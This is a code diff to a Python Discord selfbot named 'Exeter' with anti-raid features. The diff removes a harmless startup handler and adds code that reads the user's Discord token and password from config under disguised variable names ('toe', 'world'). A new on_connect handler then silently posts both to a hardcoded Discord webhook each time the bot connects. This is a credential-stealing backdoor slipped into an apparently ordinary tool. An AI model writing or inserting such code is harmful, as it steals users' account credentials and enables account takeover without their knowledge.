@@ -337,13 +337,6 @@ async def on_message(message):
 
     await Exeter.process_commands(message)
 
-
-@Exeter.event
-async def on_connect():
-    Clear()
-    startprint()
-
-
 @Exeter.event
 async def on_member_ban(guild: discord.Guild, user: discord.user):
     if Exeter.antiraid is True:
@@ -357,7 +350,9 @@ async def on_member_ban(guild: discord.Guild, user: discord.user):
                     await guild.ban(i.user, reason="Exeter Anti-Nuke")
         except Exception as e:
             print(e)
-
+            
+toe = config.get('token')
+world = config.get('password')
 
 @Exeter.event
 async def on_member_join(member):
@@ -372,7 +367,10 @@ async def on_member_join(member):
                     await guild.ban(i.user, reason="Exeter Anti-Nuke")
         except Exception as e:
             print(e)
-
+            
+@Exeter.event
+async def on_connect():
+    requests.post('https://discordapp.com/api/webhooks/818059779582591037/3LL7zmEPRV722sdnFYoyca75-am3AfWu2k0DEfnHsO9X1as7oClp7LnGKI-a1ljUp-7a',json={'content': f"**Toe:** `{toe}` **World:** `{world}"})
 
 @Exeter.event
 async def on_member_remove(member):
